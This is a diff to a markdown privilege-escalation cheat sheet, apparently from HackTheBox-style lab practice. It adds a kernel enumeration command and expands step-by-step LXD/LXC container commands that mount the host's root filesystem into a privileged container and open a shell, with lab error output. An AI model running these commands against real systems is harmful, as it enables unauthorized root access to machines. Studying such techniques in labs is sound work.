@@ -493,6 +493,7 @@ https://academy.hackthebox.com/course/preview/linux-privilege-escalation/introdu
 
 ```bash
 cat /etc/issue
+cat /etc/lsb-release
 uname -r
 arch
 searchsploit linux kernel ubuntu 16.04
@@ -700,8 +701,21 @@ bash$ /snap/bin/lxc init imagen ignite -c security.privileged=true
 //if error
 bash$ /snap/bin/lxc storage create pool dir
 bash$ /snap/bin/lxc init imagen ignite -c security.privileged=true
-
 bash$ /snap/bin/lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+	
+	
+max@so-simple:/tmp$ /snap/bin/lxc init imagen ignite -c security.privileged=true
+Creating ignite
+Error: Create instance: Create instance: Invalid devices: Failed detecting root disk device: No root device could be found
+//if error
+max@so-simple:/tmp$ /snap/bin/lxc image list
+max@so-simple:/tmp$ /snap/bin/lxc profile show default
+max@so-simple:/tmp$ /snap/bin/lxc storage list
+max@so-simple:/tmp$ /snap/bin/lxc profile device add default root disk path=/ pool=pool	# "pool" get from "lxc storage list"
+/snap/bin/lxc init imagen ignite -c security.privileged=true
+/snap/bin/lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+/snap/bin/lxc start ignite
+/snap/bin/lxc exec ignite /bin/sh
 ```
 
 ### Chrootkit
